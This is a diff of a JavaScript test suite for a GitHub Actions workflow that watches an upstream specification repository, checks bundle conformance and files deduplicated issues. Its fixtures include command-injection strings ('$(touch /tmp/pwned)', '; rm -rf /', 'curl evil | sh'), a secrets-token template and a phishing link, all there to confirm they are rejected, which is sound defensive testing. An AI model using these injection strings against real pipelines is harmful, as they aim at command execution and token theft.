@@ -7,46 +7,35 @@ import { fileURLToPath } from "node:url";
 import yaml from "js-yaml";
 
 import {
-  INSTALL_LABEL,
   LABEL,
   LIMITS,
   RESULT_SCHEMA,
   capBody,
   childEnv,
-  collectMcp,
   collectOkf,
   conformanceKey,
   countSymlinks,
   createGitHub,
   fence,
   fileIssue,
-  isInfrastructureFailure,
-  isNewerStable,
   issueBody,
   main,
   marker,
   parseArgs,
-  parsePins,
-  renderMcp,
+  parsePin,
   renderOkf,
   report,
   sanitizeInline,
   validateResult,
-  verificationSteps,
-} from "./upstream-watch.mjs";
+} from "./okf-upstream-watch.mjs";
 import { parseActionDocument, validateIdentities } from "./workflow-actions.mjs";
 
 const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
-const realPins = parsePins(readFileSync(path.join(root, "scripts", "upstream-watch.json"), "utf8"));
 const LS = String.fromCharCode(0x2028); // LINE SEPARATOR, a newline to some Markdown renderers
 const PIN = "a".repeat(40);
 const NEXT = "b".repeat(40);
 const HEAD = "c".repeat(40);
-const pins = {
-  schema: "superbee.upstream-watch.v1",
-  okf: { repo: "example/okf", path: "SPEC.md", commit: PIN },
-  mcp: { "@modelcontextprotocol/sdk": "1.32.1", "@modelcontextprotocol/ext-apps": "1.7.5" },
-};
+const pin = { schema: "superbee.okf-upstream-watch.v1", repo: "example/okf", path: "SPEC.md", commit: PIN };
 const HOSTILE = "evil`name`$(touch /tmp/pwned)${{ secrets.GITHUB_TOKEN }}\n@everyone" + LS + "```";
 const PHISH = "x| @octocat [phish](https://evil.example) |y";
 const clean = { code: 0, stdout: JSON.stringify({ docs: 9, malformed: 0 }), stderr: "" };
@@ -62,7 +51,7 @@ function githubFake(routes) {
 }
 
 function treeFake(bundleNames, setup = () => {}) {
-  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-test-"));
+  const dir = mkdtempSync(path.join(tmpdir(), "okf-upstream-watch-test-"));
   const rootDir = path.join(dir, "okf-main");
   mkdirSync(rootDir, { recursive: true });
   for (const name of bundleNames) mkdirSync(path.join(rootDir, "bundles", name), { recursive: true });
@@ -81,9 +70,9 @@ const okfRoutes = (latestSpec, files = []) => ({
 });
 
 // Collect, then cross the job boundary exactly as the workflow does: JSON, validate, render.
-async function okfRun({ latestSpec = PIN, files = [], bundles = [], setup, runStatus = async () => clean }) {
-  const raw = await collectOkf({ pins, github: githubFake(okfRoutes(latestSpec, files)).get, fetchTree: treeFake(bundles, setup).fetchTree, runStatus });
-  return renderOkf(validateResult(JSON.parse(JSON.stringify(raw)), pins, "okf"), pins);
+async function okfRun({ latestSpec = PIN, files = [], bundles = [], setup, runStatus = async () => clean, routes }) {
+  const raw = await collectOkf({ pin, github: githubFake(routes ?? okfRoutes(latestSpec, files)).get, fetchTree: treeFake(bundles, setup).fetchTree, runStatus });
+  return renderOkf(validateResult(JSON.parse(JSON.stringify(raw))), pin);
 }
 
 function throwingClient() {
@@ -91,25 +80,20 @@ function throwingClient() {
   return { ensureLabel: fail, hasMarker: fail, createIssue: fail };
 }
 
-test("the committed pin file is valid and names the dependencies the workspace actually uses", () => {
-  assert.equal(realPins.okf.repo, "GoogleCloudPlatform/open-knowledge-format");
-  const manifest = JSON.parse(readFileSync(path.join(root, "packages", "mcp-app", "package.json"), "utf8"));
-  for (const name of Object.keys(realPins.mcp)) assert.ok(manifest.dependencies?.[name], `${name} is not an mcp-app dependency`);
-  for (const broken of [
-    { ...pins, schema: "other" },
-    { ...pins, okf: { ...pins.okf, commit: "main" } },
-    { ...pins, okf: { ...pins.okf, repo: "a/b/c" } },
-    { ...pins, mcp: { "@modelcontextprotocol/sdk": "^1.0.0" } },
-    { ...pins, mcp: {} },
-  ]) assert.throws(() => parsePins(JSON.stringify(broken)));
+test("the committed pin file is valid", () => {
+  const committed = parsePin(readFileSync(path.join(root, "scripts", "okf-upstream-watch.json"), "utf8"));
+  assert.equal(committed.repo, "GoogleCloudPlatform/open-knowledge-format");
+  for (const broken of [{ ...pin, schema: "other" }, { ...pin, commit: "main" }, { ...pin, repo: "a/b/c" }, { ...pin, path: "README.md" }]) {
+    assert.throws(() => parsePin(JSON.stringify(broken)));
+  }
 });
 
 test("an unchanged SPEC pin with conforming bundles produces no issue", async () => {
   const github = githubFake(okfRoutes(PIN));
   const tree = treeFake(["acme_retail", "ga4"]);
   const seen = [];
-  const raw = await collectOkf({ pins, github: github.get, fetchTree: tree.fetchTree, runStatus: async (dir) => { seen.push(path.basename(dir)); return clean; } });
-  const rendered = renderOkf(validateResult(raw, pins, "okf"), pins);
+  const raw = await collectOkf({ pin, github: github.get, fetchTree: tree.fetchTree, runStatus: async (dir) => { seen.push(path.basename(dir)); return clean; } });
+  const rendered = renderOkf(validateResult(raw), pin);
   assert.equal(rendered.kind, "ok");
   assert.equal(rendered.title, null);
   assert.deepEqual(seen, ["acme_retail", "ga4"]);
@@ -126,7 +110,7 @@ test("a changed SPEC commit produces the deterministic title, key, compare link 
   assert.ok(body.startsWith(`<!-- upstream-watch:okf-spec:${NEXT} -->\n`));
   assert.match(body, new RegExp(`https://github.com/example/okf/compare/${PIN}\\.\\.\\.${NEXT}`));
   assert.match(body, /Changed files \(2\): `SPEC\.md`, `bundles\/ga4\/index\.md`/);
-  assert.match(body, /bump the reviewed pin in `scripts\/upstream-watch\.json`/);
+  assert.match(body, /bump the reviewed pin in `scripts\/okf-upstream-watch\.json`/);
   assert.match(body, /Run: https:\/\/github.com\/o\/r\/actions\/runs\/1/);
 });
 
@@ -157,8 +141,7 @@ test("conformance failures are reported per bundle with a key stable across upst
   assert.match(rendered.summary, /stderr from `exits`:\n\n```text\nboom\n```/);
 
   // A new upstream commit with the same failures keeps the key; a different failure set does not.
-  const routes = { ...okfRoutes(PIN), "/repos/example/okf/commits?per_page=1": [{ sha: "d".repeat(40) }] };
-  const later = renderOkf(validateResult(await collectOkf({ pins, github: githubFake(routes).get, fetchTree: treeFake(Object.keys(outcomes)).fetchTree, runStatus }), pins, "okf"), pins);
+  const later = await okfRun({ bundles: Object.keys(outcomes), runStatus, routes: { ...okfRoutes(PIN), "/repos/example/okf/commits?per_page=1": [{ sha: "d".repeat(40) }] } });
   assert.equal(later.key, rendered.key);
   assert.equal(conformanceKey(PIN, [{ name: "b", reasons: ["x"] }, { name: "a", reasons: ["y"] }]), conformanceKey(PIN, [{ name: "a", reasons: ["y"] }, { name: "b", reasons: ["x"] }]));
   assert.notEqual(conformanceKey(PIN, [{ name: "a", reasons: ["y"] }]), conformanceKey(PIN, [{ name: "a", reasons: ["z"] }]));
@@ -187,7 +170,7 @@ test("symlinks anywhere in a bundle fail that bundle without being read, and dan
   for (const name of ["linked", "dangling", "whole-bundle"]) {
     assert.match(rendered.summary, new RegExp(`\`${name}\` \\| - \\| - \\| - \\| - \\| FAIL: contains 1 symbolic link`));
   }
-  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-loop-"));
+  const dir = mkdtempSync(path.join(tmpdir(), "okf-upstream-watch-loop-"));
   try {
     symlinkSync(dir, path.join(dir, "loop"));
     symlinkSync(path.join(dir, "missing"), path.join(dir, "dangling"));
@@ -214,99 +197,35 @@ test("table cells cannot be broken out of, and mentions and links are neutralize
   }
 });
 
-test("MCP drift counts only strictly newer stable releases", () => {
-  assert.equal(isNewerStable("1.33.0", "1.32.1"), true);
-  assert.equal(isNewerStable("2.0.0", "1.99.99"), true);
-  assert.equal(isNewerStable("1.32.1", "1.32.1"), false);
-  assert.equal(isNewerStable("1.32.0", "1.32.1"), false);
-  assert.equal(isNewerStable("1.33.0-beta.1", "1.32.1"), false);
-  assert.equal(isNewerStable("1.10.0", "1.9.0"), true, "numeric, not lexical, comparison");
-  for (const junk of ["", "latest", "v1.33.0", "1.33", "1.33.0 ; rm -rf /", undefined]) assert.equal(isNewerStable(junk, "1.32.1"), false);
-
-  const render = (sdk, ext) => renderMcp(validateResult({ schema: RESULT_SCHEMA, target: "mcp", status: "ok", verification: null,
-    packages: [{ name: "@modelcontextprotocol/sdk", latest: sdk }, { name: "@modelcontextprotocol/ext-apps", latest: ext }] }, pins, "mcp"), pins);
-  assert.equal(render("1.32.1", "1.8.0-rc.1").title, null);
-  const both = render("1.33.0", "2.0.3");
-  assert.equal(both.title, "Upstream drift: @modelcontextprotocol/sdk 1.33.0, @modelcontextprotocol/ext-apps 2.0.3");
-  assert.equal(both.key, "mcp:@modelcontextprotocol/sdk@1.33.0,@modelcontextprotocol/ext-apps@2.0.3");
-  assert.equal(render("1.33.0", "1.7.5").title, "Upstream drift: @modelcontextprotocol/sdk 1.33.0");
-  const hostile = render(HOSTILE.slice(0, 60), "1.7.5");
-  assert.equal(hostile.title, null);
-  assert.match(hostile.summary, /unreadable version/);
-  assert.doesNotMatch(hostile.summary, /\n@everyone/);
-});
-
-test("MCP verification runs argv arrays in order, stops at the first failure, and is skipped without --verify", async () => {
-  const latest = { "@modelcontextprotocol/sdk": "1.33.0\n", "@modelcontextprotocol/ext-apps": "1.7.5" };
-  const npmView = async (name) => latest[name];
-  const skipped = await collectMcp({ pins, npmView, runNpm: async () => assert.fail("must not run npm without --verify"), verify: false });
-  assert.equal(skipped.verification, null);
-  assert.match(renderMcp(validateResult(skipped, pins, "mcp"), pins).summary, /Verification against the newer versions was skipped/);
-
-  const calls = [];
-  const runNpm = async (argv) => {
-    calls.push(argv);
-    return argv[1] === "typecheck" ? { code: 2, stdout: "x".repeat(10000), stderr: "TS2345 ```" } : { code: 0, stdout: "", stderr: "" };
-  };
-  const raw = await collectMcp({ pins, npmView, runNpm, verify: true });
-  assert.deepEqual(calls, verificationSteps([{ name: "@modelcontextprotocol/sdk", version: "1.33.0" }]).slice(0, 3).map((step) => step.argv));
-  assert.deepEqual(calls[0], ["install", "--no-audit", "--no-fund", "--ignore-scripts", "-w", "@superbee/mcp-app", "@modelcontextprotocol/sdk@1.33.0"]);
-  const rendered = renderMcp(validateResult(JSON.parse(JSON.stringify(raw)), pins, "mcp"), pins);
-  assert.equal(rendered.kind, "drift");
-  assert.match(rendered.summary, /\| `npm run typecheck` \| 2 \|/);
-  assert.match(rendered.summary, /````text\n[\s\S]*TS2345 ```\n````/, "the fence outgrows backtick runs in tool output");
-  assert.ok(rendered.summary.length < LIMITS.log + 2000, "tool output is capped");
-
-  const passing = await collectMcp({ pins, npmView, runNpm: async () => ({ code: 0, stdout: "", stderr: "" }), verify: true });
-  assert.match(renderMcp(validateResult(passing, pins, "mcp"), pins).summary, /All verification steps passed/);
-});
-
 test("watcher failures are classified apart from drift and deduplicated against open issues only", async () => {
-  const npmDown = await collectMcp({ pins, npmView: async () => { throw new Error("npm view @modelcontextprotocol/sdk exited 1"); }, runNpm: async () => assert.fail(), verify: true });
-  assert.equal(npmDown.status, "error");
-  const down = renderMcp(validateResult(npmDown, pins, "mcp"), pins);
-  assert.deepEqual([down.kind, down.title, down.key, down.openOnly], ["error", "Upstream watch failing: mcp", "failing:mcp", true]);
+  const apiDown = await collectOkf({ pin, github: async () => { throw new Error("GitHub HTTP 503 for GET /repos/example/okf/commits"); }, fetchTree: async () => assert.fail(), runStatus: async () => assert.fail() });
+  assert.equal(apiDown.status, "error");
+  const down = renderOkf(validateResult(apiDown), pin);
+  assert.deepEqual([down.kind, down.title, down.key, down.openOnly], ["error", "Upstream watch failing: okf", "failing:okf", true]);
   assert.match(issueBody(down), /watcher could not complete/);
-
-  const latest = { "@modelcontextprotocol/sdk": "1.33.0", "@modelcontextprotocol/ext-apps": "1.7.5" };
-  const registry = await collectMcp({ pins, npmView: async (n) => latest[n], runNpm: async () => ({ code: 1, stdout: "", stderr: "npm error code ETIMEDOUT\nnpm error network request to https://registry.npmjs.org failed" }), verify: true });
-  assert.equal(renderMcp(validateResult(registry, pins, "mcp"), pins).kind, "error");
-  assert.equal(isInfrastructureFailure({ label: INSTALL_LABEL, code: 1, output: "npm error code E503" }), true);
-  assert.equal(isInfrastructureFailure({ label: "npm run build", code: 2, output: "ETIMEDOUT in a test" }), false, "only the install step can be a registry failure");
-  assert.equal(isInfrastructureFailure({ label: INSTALL_LABEL, code: 1, output: "ERESOLVE could not resolve peer" }), false, "an unresolvable dependency graph is drift");
-
-  const apiDown = await collectOkf({ pins, github: async () => { throw new Error("GitHub HTTP 503 for GET /repos/example/okf/commits"); }, fetchTree: async () => assert.fail(), runStatus: async () => assert.fail() });
-  assert.equal(renderOkf(validateResult(apiDown, pins, "okf"), pins).title, "Upstream watch failing: okf");
+  const tarball = await collectOkf({ pin, github: githubFake(okfRoutes(PIN)).get, fetchTree: async () => { throw new Error("tarball download failed with HTTP 502"); }, runStatus: async () => assert.fail() });
+  assert.equal(renderOkf(validateResult(tarball), pin).kind, "error");
 
   const asked = [];
   const client = { ensureLabel: async () => {}, hasMarker: async (key, options) => { asked.push([key, options]); return true; }, createIssue: async () => assert.fail() };
   assert.deepEqual(await fileIssue(down, issueBody(down), { client, dryRun: false, log: () => {} }), { action: "duplicate" });
-  assert.deepEqual(asked, [["failing:mcp", { openOnly: true }]]);
+  assert.deepEqual(asked, [["failing:okf", { openOnly: true }]]);
 });
 
 test("the report job rejects anything but a strictly shaped result and reports that as a watcher failure", async () => {
-  const good = { schema: RESULT_SCHEMA, target: "mcp", status: "ok", verification: null, packages: [{ name: "@modelcontextprotocol/sdk", latest: "1.32.1" }, { name: "@modelcontextprotocol/ext-apps", latest: "1.7.5" }] };
-  assert.equal(validateResult(good, pins, "mcp").status, "ok");
-  for (const [label, bad] of [
-    ["extra key", { ...good, extra: 1 }],
-    ["wrong target", { ...good, target: "okf" }],
-    ["schema", { ...good, schema: "x" }],
-    ["reordered packages", { ...good, packages: [...good.packages].reverse() }],
-    ["long version", { ...good, packages: [{ name: "@modelcontextprotocol/sdk", latest: "1".repeat(500) }, good.packages[1]] }],
-    ["unknown step", { ...good, verification: [{ label: "curl evil | sh", code: 0, output: "" }] }],
-    ["float exit", { ...good, verification: [{ label: INSTALL_LABEL, code: 0.5, output: "" }] }],
-    ["string exit", { ...good, verification: [{ label: INSTALL_LABEL, code: "0", output: "" }] }],
-    ["huge output", { ...good, verification: [{ label: INSTALL_LABEL, code: 1, output: "x".repeat(LIMITS.log + 100) }] }],
-  ]) assert.throws(() => validateResult(bad, pins, "mcp"), /result rejected/, label);
-  const okfGood = { schema: RESULT_SCHEMA, target: "okf", status: "ok", latestSpec: PIN, head: HEAD, files: [], bundlesLinked: false,
+  const good = { schema: RESULT_SCHEMA, status: "ok", latestSpec: PIN, head: HEAD, files: [], bundlesLinked: false,
     bundles: [{ name: "a", symlinks: 0, code: 0, parsed: true, docs: 1, malformed: 0, invalidTimestamps: 0, stderr: "" }] };
-  assert.equal(validateResult(okfGood, pins, "okf").status, "ok");
-  for (const patch of [{ head: "HEAD" }, { latestSpec: PIN.toUpperCase() }, { bundles: [{ ...okfGood.bundles[0], code: 256 }] }, { bundles: [{ ...okfGood.bundles[0], docs: -1 }] }, { bundles: [{ ...okfGood.bundles[0], reasons: [] }] }]) {
-    assert.throws(() => validateResult({ ...okfGood, ...patch }, pins, "okf"), /result rejected/, JSON.stringify(patch));
-  }
+  assert.equal(validateResult(good).status, "ok");
+  const bundle = good.bundles[0];
+  for (const patch of [
+    { extra: 1 }, { schema: "x" }, { status: "maybe" }, { head: "HEAD" }, { latestSpec: PIN.toUpperCase() },
+    { files: ["x".repeat(1000)] }, { bundlesLinked: "no" },
+    { bundles: [{ ...bundle, code: 256 }] }, { bundles: [{ ...bundle, code: 0.5 }] }, { bundles: [{ ...bundle, code: "0" }] },
+    { bundles: [{ ...bundle, docs: -1 }] }, { bundles: [{ ...bundle, reasons: [] }] }, { bundles: [{ ...bundle, stderr: "x".repeat(LIMITS.log + 100) }] },
+  ]) assert.throws(() => validateResult({ ...good, ...patch }), /result rejected/, JSON.stringify(patch).slice(0, 80));
 
   const printed = [];
-  const { rendered } = await report("mcp", { ...good, extra: "<script>" }, pins, {}, { client: throwingClient(), log: (t) => printed.push(t) }, { dryRun: true });
+  const { rendered } = await report({ ...good, extra: "<script>" }, pin, {}, { client: throwingClient(), log: (t) => printed.push(t) }, { dryRun: true });
   assert.equal(rendered.kind, "error");
   assert.match(printed.join(""), /result rejected: result has unknown key extra/);
 });
@@ -347,8 +266,7 @@ test("issues are deduplicated by body marker across open and closed issues regar
   // Same title without the marker, a different key, or a pull request does not suppress.
   searchItems = [{ state: "open", title: rendered.title, body: "no marker" }, { state: "open", title: "pr", body: marker(key), pull_request: {} }];
   labelled = [{ state: "open", title: "x", body: marker(`${key}0`) }];
-  const created = await fileIssue(rendered, body, { client, dryRun: false, log });
-  assert.deepEqual(created, { action: "created", url: "https://github.com/o/r/issues/9" });
+  assert.deepEqual(await fileIssue(rendered, body, { client, dryRun: false, log }), { action: "created", url: "https://github.com/o/r/issues/9" });
   const post = requests.at(-1);
   assert.equal(post.url, "https://api.github.com/repos/o/r/issues");
   assert.deepEqual(post.body, { title: rendered.title, body, labels: [LABEL] });
@@ -367,8 +285,7 @@ test("issues are deduplicated by body marker across open and closed issues regar
 test("dry run prints the would-be issue and never calls the issue client", async () => {
   const printed = [];
   const rendered = { kind: "drift", title: "Upstream drift: x", key: "k", summary: "s" };
-  const outcome = await fileIssue(rendered, "body text", { client: throwingClient(), dryRun: true, log: (text) => printed.push(text) });
-  assert.deepEqual(outcome, { action: "dry-run" });
+  assert.deepEqual(await fileIssue(rendered, "body text", { client: throwingClient(), dryRun: true, log: (text) => printed.push(text) }), { action: "dry-run" });
   assert.match(printed.join(""), /Title: Upstream drift: x\n\nbody text/);
 });
 
@@ -402,52 +319,56 @@ test("child processes never inherit credentials or workflow command files", () =
 });
 
 test("arguments are strict", () => {
-  assert.deepEqual(parseArgs(["okf", "--dry-run"]), { command: "okf", target: "okf", dryRun: true, verify: false, collect: null, input: null });
-  assert.deepEqual(parseArgs(["mcp", "--verify", "--collect", "r.json"]), { command: "mcp", target: "mcp", dryRun: false, verify: true, collect: "r.json", input: null });
-  assert.deepEqual(parseArgs(["report", "okf", "--input", "r.json", "--dry-run"]), { command: "report", target: "okf", dryRun: true, verify: false, collect: null, input: "r.json" });
-  for (const bad of [[], ["both"], ["okf", "--verify"], ["mcp", "--force"], ["report", "okf"], ["report", "both", "--input", "x"], ["okf", "--collect", "x", "--dry-run"], ["report", "mcp", "--input", "x", "--verify"]]) {
+  assert.deepEqual(parseArgs(["--dry-run"]), { command: "collect", dryRun: true, collect: null, input: null });
+  assert.deepEqual(parseArgs(["--collect", "r.json"]), { command: "collect", dryRun: false, collect: "r.json", input: null });
+  assert.deepEqual(parseArgs(["report", "--input", "r.json", "--dry-run"]), { command: "report", dryRun: true, collect: null, input: "r.json" });
+  for (const bad of [["okf"], ["mcp"], ["--verify"], ["report"], ["report", "--collect", "x"], ["--collect", "x", "--dry-run"], ["--input", "x"]]) {
     assert.throws(() => parseArgs(bad), undefined, bad.join(" "));
   }
 });
 
 test("collect writes only the result file; report writes the summary and treats a missing result as a watcher failure", async (t) => {
-  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-main-"));
+  const dir = mkdtempSync(path.join(tmpdir(), "okf-upstream-watch-main-"));
   t.after(() => rmSync(dir, { recursive: true, force: true }));
   const resultFile = path.join(dir, "out", "result.json");
   const summaryFile = path.join(dir, "summary.md");
-  const latest = Object.fromEntries(Object.keys(realPins.mcp).map((name) => [name, realPins.mcp[name]]));
-  await main(["mcp", "--collect", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, {
-    npmView: async (name) => latest[name],
+  const committed = parsePin(readFileSync(path.join(root, "scripts", "okf-upstream-watch.json"), "utf8"));
+  const routes = {
+    [`/repos/${committed.repo}/commits?path=SPEC.md&per_page=1`]: [{ sha: committed.commit }],
+    [`/repos/${committed.repo}/commits?per_page=1`]: [{ sha: HEAD }],
+  };
+  await main(["--collect", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, {
+    github: { get: githubFake(routes).get },
+    fetchTree: treeFake(["ga4"]).fetchTree,
+    runStatus: async () => clean,
     log: () => assert.fail("collect prints no report"),
   });
   assert.throws(() => readFileSync(summaryFile), /ENOENT/, "the collect phase never writes the job summary");
   assert.equal(JSON.parse(readFileSync(resultFile, "utf8")).status, "ok");
 
-  const result = await main(["report", "mcp", "--input", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, { client: throwingClient(), log: () => assert.fail() });
+  const result = await main(["report", "--input", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, { client: throwingClient(), log: () => assert.fail() });
   assert.equal(result.outcome.action, "none");
-  assert.match(readFileSync(summaryFile, "utf8"), /## MCP upstream watch[\s\S]*No drift: no issue needed\./);
+  assert.match(readFileSync(summaryFile, "utf8"), /## OKF upstream watch[\s\S]*No drift: no issue needed\./);
 
   const printed = [];
-  const missing = await main(["report", "okf", "--input", path.join(dir, "absent.json"), "--dry-run"], {}, { client: throwingClient(), log: (text) => printed.push(text) });
+  const missing = await main(["report", "--input", path.join(dir, "absent.json"), "--dry-run"], {}, { client: throwingClient(), log: (text) => printed.push(text) });
   assert.equal(missing.rendered.title, "Upstream watch failing: okf");
   assert.match(printed.join(""), /the check job wrote no result/);
 });
 
-test("the workflow isolates upstream code from write permissions and the issue writer from upstream content", () => {
-  const text = readFileSync(path.join(root, ".github", "workflows", "upstream-watch.yml"), "utf8");
+test("the workflow isolates upstream content from write permissions and the issue writer from upstream content", () => {
+  const text = readFileSync(path.join(root, ".github", "workflows", "okf-upstream-watch.yml"), "utf8");
   const identities = validateIdentities(JSON.parse(readFileSync(path.join(root, "scripts", "ci-lanes.json"), "utf8")).github_actions.identities);
-  const { document } = parseActionDocument(text, "upstream-watch.yml", { identities });
+  const { document } = parseActionDocument(text, "okf-upstream-watch.yml", { identities });
   const on = document.on ?? document[true];
-  assert.deepEqual(on.schedule.map((row) => row.cron), ["41 6 * * 1", "29 6 * * *"]);
+  assert.deepEqual(on.schedule.map((row) => row.cron), ["41 6 * * 1"]);
+  assert.deepEqual(Object.keys(on.workflow_dispatch.inputs), ["dry_run"]);
   assert.equal(on.workflow_dispatch.inputs.dry_run.default, true);
-  assert.deepEqual(on.workflow_dispatch.inputs.target.options, ["both", "okf", "mcp"]);
   assert.deepEqual(document.permissions, { contents: "read" });
-  assert.deepEqual(Object.keys(document.jobs).sort(), ["mcp-check", "mcp-report", "okf-check", "okf-report"]);
-  assert.match(document.jobs["okf-check"].if, /github\.event\.schedule == '41 6 \* \* 1'/);
-  assert.match(document.jobs["mcp-check"].if, /github\.event\.schedule == '29 6 \* \* \*'/);
+  assert.deepEqual(Object.keys(document.jobs).sort(), ["check", "report"]);
 
   const runs = (job) => job.steps.filter((step) => typeof step.run === "string").map((step) => step.run).join("\n");
-  const untrusted = /\bnpm (?:ci|install|run|test|exec)\b|\bnpx\b|upstream-watch\.mjs (?:okf|mcp)\b/;
+  const untrusted = /\bnpm (?:ci|install|run|test|exec)\b|\bnpx\b|okf-upstream-watch\.mjs (?:--collect|--dry-run)\b/;
   for (const [name, job] of Object.entries(document.jobs)) {
     const writes = Object.entries(job.permissions ?? {}).filter(([, level]) => level === "write");
     const checkout = job.steps.find((step) => step.uses?.startsWith("actions/checkout@"));
@@ -459,22 +380,32 @@ test("the workflow isolates upstream code from write permissions and the issue w
       if (typeof step.run === "string") assert.doesNotMatch(step.run, /\b(git push|git commit|gh pr|npm publish)\b/);
     }
     if (untrusted.test(runs(job))) {
-      assert.deepEqual(writes, [], `${name} runs upstream code or reads upstream content and must hold no write permission`);
-      assert.ok(name.endsWith("-check"), name);
+      assert.deepEqual(writes, [], `${name} reads upstream content and must hold no write permission`);
       assert.ok(job.steps.some((step) => step.uses?.startsWith("actions/upload-artifact@")), `${name} hands off through an artifact`);
     }
     if (writes.length > 0) {
       assert.deepEqual(job.permissions, { contents: "read", issues: "write" }, name);
-      assert.doesNotMatch(runs(job), untrusted, `${name} must not install, build, test, or collect upstream content`);
-      assert.match(runs(job), /^(?:.*\n)?\s*(?:if .*|else|fi|node scripts\/upstream-watch\.mjs report (?:okf|mcp) --input "\$RUNNER_TEMP\/upstream-watch\/result\.json"(?: --dry-run)?)$/m);
       for (const line of runs(job).split("\n").map((l) => l.trim()).filter(Boolean)) {
-        assert.match(line, /^(?:if \[ "\$DRY_RUN" = "true" \]; then|else|fi|node scripts\/upstream-watch\.mjs report (?:okf|mcp) --input "\$RUNNER_TEMP\/upstream-watch\/result\.json"(?: --dry-run)?)$/, `${name} runs only the report command: ${line}`);
+        assert.match(line, /^(?:if \[ "\$DRY_RUN" = "true" \]; then|else|fi|node scripts\/okf-upstream-watch\.mjs report --input "\$RUNNER_TEMP\/okf-upstream-watch\/result\.json"(?: --dry-run)?)$/, `${name} runs only the report command: ${line}`);
       }
       assert.ok(job.steps.some((step) => step.uses?.startsWith("actions/download-artifact@")), `${name} reads the check result`);
-      assert.equal(job.if, `\${{ always() && needs.${name.replace("-report", "-check")}.result != 'skipped' }}`);
+      assert.equal(job.if, "${{ always() && needs.check.result != 'skipped' }}");
     }
   }
-  assert.match(runs(document.jobs["mcp-check"]), /upstream-watch\.mjs mcp --verify --collect/);
-  assert.match(runs(document.jobs["okf-check"]), /npm run build[\s\S]*upstream-watch\.mjs okf --collect/);
+  assert.match(runs(document.jobs.check), /npm run build[\s\S]*okf-upstream-watch\.mjs --collect/);
   assert.ok(yaml.safeLoad(text));
+});
+
+test("MCP SDK drift is delegated to a daily, grouped Dependabot npm updater that keeps majors", () => {
+  const config = yaml.safeLoad(readFileSync(path.join(root, ".github", "dependabot.yml"), "utf8"));
+  const npm = config.updates.filter((entry) => entry["package-ecosystem"] === "npm");
+  assert.equal(npm.length, 1);
+  assert.deepEqual(npm[0], {
+    "package-ecosystem": "npm",
+    directory: "/",
+    schedule: { interval: "daily" },
+    allow: [{ "dependency-name": "@modelcontextprotocol/*" }],
+    groups: { "mcp-sdk": { patterns: ["@modelcontextprotocol/*"] } },
+    labels: ["dependencies", "javascript"],
+  }, "no ignore rules and no update-types filter, so major versions open PRs");
 });
